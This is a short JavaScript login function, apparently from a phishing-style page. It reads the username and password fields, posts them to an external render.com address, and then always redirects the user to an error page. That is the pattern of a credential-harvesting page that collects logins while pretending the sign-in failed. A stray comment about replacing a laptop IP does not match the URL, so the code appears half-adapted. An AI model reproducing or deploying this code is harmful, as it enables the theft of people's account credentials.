
function login() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    fetch("https://dashboard.render.com/web/srv-cvf2lmbqf0us73fl3h40", {  // Replace YOUR_LAPTOP_IP with your actual IP
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        window.location.href = "error.html"; // Redirect to error page
    })
    .catch(error => console.error("Error:", error));
}
